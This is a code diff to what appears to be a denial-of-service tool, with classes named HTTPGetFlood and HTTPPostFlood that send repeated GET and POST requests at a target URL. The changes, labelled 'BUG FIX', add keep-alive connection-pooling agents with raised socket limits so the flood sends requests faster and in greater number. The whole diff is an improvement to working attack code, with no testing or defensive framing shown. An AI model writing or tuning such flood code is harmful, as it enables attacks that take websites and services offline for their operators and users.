@@ -73,16 +73,26 @@ export class HTTPGetFlood {
     async attack() {
         return new Promise((resolve) => {
             try {
+                // BUG FIX: Add agent for connection pooling and reuse
+                const protocol = this.url.protocol === 'https:' ? https : http;
+                const agent = new protocol.Agent({
+                    keepAlive: true,
+                    keepAliveMsecs: 1000,
+                    maxSockets: this.rpc * 2, // Allow more concurrent sockets
+                    maxFreeSockets: this.rpc,
+                    timeout: 5000,
+                    scheduling: 'lifo' // Use last-in-first-out for better performance
+                });
+
                 const options = {
                     hostname: this.url.hostname,
                     port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                     path: this.url.pathname + this.url.search,
                     method: 'GET',
                     headers: this.generateHeaders(),
-                    timeout: 900
+                    timeout: 900,
+                    agent: agent // BUG FIX: Use agent for connection reuse
                 };
-
-                const protocol = this.url.protocol === 'https:' ? https : http;
 
                 const makeRequest = () => {
                     if (!this.active) {
@@ -148,16 +158,26 @@ export class HTTPPostFlood extends HTTPGetFlood {
                 headers['Content-Length'] = Buffer.byteLength(payload);
                 headers['X-Requested-With'] = 'XMLHttpRequest';
 
+                // BUG FIX: Add agent for connection pooling and reuse
+                const protocol = this.url.protocol === 'https:' ? https : http;
+                const agent = new protocol.Agent({
+                    keepAlive: true,
+                    keepAliveMsecs: 1000,
+                    maxSockets: this.rpc * 2,
+                    maxFreeSockets: this.rpc,
+                    timeout: 5000,
+                    scheduling: 'lifo'
+                });
+
                 const options = {
                     hostname: this.url.hostname,
                     port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                     path: this.url.pathname + this.url.search,
                     method: 'POST',
                     headers: headers,
-                    timeout: 900
+                    timeout: 900,
+                    agent: agent // BUG FIX: Use agent for connection reuse
                 };
-
-                const protocol = this.url.protocol === 'https:' ? https : http;
 
                 const makeRequest = () => {
                     if (!this.active) {
